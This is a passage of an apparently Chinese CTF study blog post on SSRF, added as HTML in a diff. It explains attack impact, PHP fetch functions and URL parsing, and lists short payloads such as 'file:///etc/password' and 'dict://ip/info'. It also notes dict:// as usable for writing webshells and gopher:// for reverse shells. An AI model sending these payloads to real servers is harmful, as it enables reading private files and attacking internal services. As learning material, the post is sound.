@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SSRF(Server-Side Request Forgery)概述[TOC] SSRF(Server-Side Request Forgery:服务器端请求伪造),字面意思来理解就是：攻击者通过一些手段来达到伪装了一个由服务端对服务器所在内网发起的恶意请求。 也因此，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF学习">
+<meta property="og:url" content="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="y@7q">
+<meta property="og:description" content="SSRF(Server-Side Request Forgery)概述[TOC] SSRF(Server-Side Request Forgery:服务器端请求伪造),字面意思来理解就是：攻击者通过一些手段来达到伪装了一个由服务端对服务器所在内网发起的恶意请求。 也因此，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416002956517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416080803299.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416083848457.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416084453141.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/Quicker_20250416_091903.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416102926004.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416105222070.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416112945370.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416193201139.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416194828764.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/2289942-20220124211658010-532695203.png">
+<meta property="article:published_time" content="2025-04-15T13:03:09.000Z">
+<meta property="article:modified_time" content="2025-08-01T03:43:59.724Z">
+<meta property="article:author" content="y@7q">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="刷题">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SSRF学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/CSRF%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&text=SSRF学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&is_video=false&description=SSRF学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSRF学习&body=Check out this article: http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&title=SSRF学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&name=SSRF学习&description=&lt;h1 id=&#34;SSRF-Server-Side-Request-Forgery-概述&#34;&gt;&lt;a href=&#34;#SSRF-Server-Side-Request-Forgery-概述&#34; class=&#34;headerlink&#34; title=&#34;SSRF(Server-Side Request Forgery)概述&#34;&gt;&lt;/a&gt;SSRF(Server-Side Request Forgery)概述&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造)&lt;/strong&gt;,字面意思来理解就是：攻击者通过一些手段来达到伪装了一个由服务端对服务器所在内网发起的恶意请求。&lt;/p&gt;
+&lt;p&gt;也因此，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/note/SSRF%E5%AD%A6%E4%B9%A0/&t=SSRF学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF-Server-Side-Request-Forgery-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">SSRF(Server-Side Request Forgery)概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E7%90%86%E5%8F%8A%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.</span> <span class="toc-text">形成原理及危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">PHP中一些关键函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-%EF%BC%88%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;（访问本地文件）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dict-%EF%BC%88%E6%9F%A5%E8%AF%A2%E5%AD%97%E5%85%B8%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">dict:&#x2F;&#x2F;（查询字典服务）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp-%EF%BC%88%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%EF%BC%89"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">ftp:&#x2F;&#x2F;（访问远程文件资源）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%EF%BC%88%E5%B5%8C%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">data:&#x2F;&#x2F;（嵌入数据）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parse-url%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">Parse_url函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8Payload"><span class="toc-number">1.2.4.</span> <span class="toc-text">常用Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.3.</span> <span class="toc-text">题目回顾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud%E5%89%8D%E7%BD%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">ImageCloud前置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud"><span class="toc-number">1.3.2.</span> <span class="toc-text">ImageCloud</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow%E5%88%B7%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">CTFshow刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web352"><span class="toc-number">1.4.1.</span> <span class="toc-text">web352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web353"><span class="toc-number">1.4.2.</span> <span class="toc-text">web353</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web354-%E5%85%AC%E5%85%B1%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">web354 公共解析域名绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web355-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B61"><span class="toc-number">1.4.4.</span> <span class="toc-text">web355 长度限制1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web356-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B62"><span class="toc-number">1.4.5.</span> <span class="toc-text">web356 长度限制2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web357-%E5%86%85%E7%BD%91IP%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.6.</span> <span class="toc-text">web357 内网IP过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter-var-%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">filter_var() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">相关过滤器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web358-%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.7.</span> <span class="toc-text">web358 @绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web359-Gopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81%E7%9A%84mysql"><span class="toc-number">1.4.8.</span> <span class="toc-text">web359 Gopher打无密码的mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web360-Gopher%E5%8D%8F%E8%AE%AE%E6%89%93redis"><span class="toc-number">1.4.9.</span> <span class="toc-text">web360 Gopher协议打redis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E4%B9%8B%E5%90%8E%E7%9A%84bypass%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">刷题之后的bypass总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E6%8C%82%E9%A9%AC"><span class="toc-number">1.5.2.</span> <span class="toc-text">公网挂马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">DNS重绑定</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-number">1.6.</span> <span class="toc-text">💡 实战场景举个例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="toc-number">1.7.</span> <span class="toc-text">🧠 详细过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopherus%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text">Gopherus使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EGopher%E5%8D%8F%E8%AE%AE%E4%B8%BA%E4%BB%80%E4%B9%88%E5%90%8E%E9%9D%A2%E8%A6%81%E6%9C%89%E4%B8%80%E4%B8%AA"><span class="toc-number">1.8.</span> <span class="toc-text">关于Gopher协议为什么后面要有一个_?</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SSRF学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">y@7q</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-15T13:03:09.000Z" class="dt-published" itemprop="datePublished">2025-04-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%90%AD%E5%BB%BA/">基础知识搭建</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="p-category" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="SSRF-Server-Side-Request-Forgery-概述"><a href="#SSRF-Server-Side-Request-Forgery-概述" class="headerlink" title="SSRF(Server-Side Request Forgery)概述"></a>SSRF(Server-Side Request Forgery)概述</h1><p>[TOC]</p>
+<p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong>,字面意思来理解就是：攻击者通过一些手段来达到伪装了一个由服务端对服务器所在内网发起的恶意请求。</p>
+<p>也因此，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<span id="more"></span>
+<h2 id="形成原理及危害"><a href="#形成原理及危害" class="headerlink" title="形成原理及危害"></a>形成原理及危害</h2><p>大多是因为服务端提供了可以从其他服务器获取数据的功能，但没有加以过滤和限制，导致了攻击者可以轻易的任意读取文件，进行内网渗透，对内网Web应用进行攻击等恶意操作。</p>
+<p><strong>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</strong></p>
+<ol>
+<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>
+<li>攻击运行在内网或本地的应用程序（比如溢出）</li>
+<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li>
+<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li>
+<li>利用 <code>file</code> 协议读取本地文件等</li>
+</ol>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="PHP中一些关键函数"><a href="#PHP中一些关键函数" class="headerlink" title="PHP中一些关键函数"></a>PHP中一些关键函数</h3><p>file_get_contents() &#x2F;&#x2F; 将整个文件读入一个字符串 </p>
+<p>file_get_contents(path,include_path,context,start,max_length)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$filename</code></td>
+<td>文件路径或 URL（启用 <code>allow_url_fopen</code> 时）</td>
+</tr>
+<tr>
+<td><code>$use_include_path</code></td>
+<td>是否在 include_path 中查找文件</td>
+</tr>
+<tr>
+<td><code>$context</code></td>
+<td><code>stream_context</code> 上下文，适用于 HTTP 配置、超时等</td>
+</tr>
+<tr>
+<td><code>$offset</code></td>
+<td>从文件的第几字节开始读取</td>
+</tr>
+<tr>
+<td><code>$length</code></td>
+<td>最多读取多少字节内容</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">// </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">curl_exec</span> ( resource <span class="variable">$ch</span> )</span><br><span class="line">    </span><br><span class="line"><span class="comment">//示例用法</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;https://example.com&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$response</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;响应：&quot;</span> . <span class="variable">$response</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$ch</code></td>
+<td>resource</td>
+<td>使用 <code>curl_init()</code> 初始化后的 cURL 会话句柄</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fsockopen</span>() <span class="comment">// 打开 Internet 或者 Unix 套接字 链接</span></span><br><span class="line"></span><br><span class="line">resource|<span class="literal">false</span> <span class="title function_ invoke__">fsockopen</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$hostname</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$port</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$error_code</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">string</span> &amp;<span class="variable">$error_message</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">float</span> <span class="variable">$timeout</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_socket_timeout&quot;</span>)</span><br><span class="line">)</span><br><span class="line">例：<span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;www.example.com&quot;</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$hostname</code></td>
+<td>string</td>
+<td>主机名或 IP 地址。支持协议前缀如 <code>ssl://</code>、<code>tls://</code> 等</td>
+</tr>
+<tr>
+<td><code>$port</code></td>
+<td>int</td>
+<td>端口号</td>
+</tr>
+<tr>
+<td><code>$error_code</code></td>
+<td>int 引用</td>
+<td>若连接失败，此变量将存储错误代码</td>
+</tr>
+<tr>
+<td><code>$error_message</code></td>
+<td>string 引用</td>
+<td>若连接失败，此变量将存储错误信息</td>
+</tr>
+<tr>
+<td><code>$timeout</code></td>
+<td>float</td>
+<td>连接超时时间，单位为秒</td>
+</tr>
+</tbody></table>
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="file-（访问本地文件）"><a href="#file-（访问本地文件）" class="headerlink" title="file:&#x2F;&#x2F;（访问本地文件）"></a>file:&#x2F;&#x2F;（访问本地文件）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/etc/</span>password  <span class="comment"># file:// 之后可以接任意文件</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="dict-（查询字典服务）"><a href="#dict-（查询字典服务）" class="headerlink" title="dict:&#x2F;&#x2F;（查询字典服务）"></a>dict:&#x2F;&#x2F;（查询字典服务）</h4><p><code>dict://ip/info</code>可获取本地<code>redis</code>服务配置信息。</p>
+<p>可以用来测试和写入webshell。</p>
+<h4 id="ftp-（访问远程文件资源）"><a href="#ftp-（访问远程文件资源）" class="headerlink" title="ftp:&#x2F;&#x2F;（访问远程文件资源）"></a>ftp:&#x2F;&#x2F;（访问远程文件资源）</h4><h4 id="data-（嵌入数据）"><a href="#data-（嵌入数据）" class="headerlink" title="data:&#x2F;&#x2F;（嵌入数据）"></a>data:&#x2F;&#x2F;（嵌入数据）</h4><p>例如直接嵌套一个Base64加密的照片：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/png;base64,0KGgoAAAAFGUIknuNSUhEUg...YGGjnm=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h4><p>常用于反弹shell</p>
+<h3 id="Parse-url函数"><a href="#Parse-url函数" class="headerlink" title="Parse_url函数"></a>Parse_url函数</h3><p>这里单独提一下Parse_url这个函数,用于拆分url的各个部分为一个类似字典的东西。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//@后</span><br><span class="line">    [user] =&gt; username			//@前</span><br><span class="line">    [pass] =&gt; password			//@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>
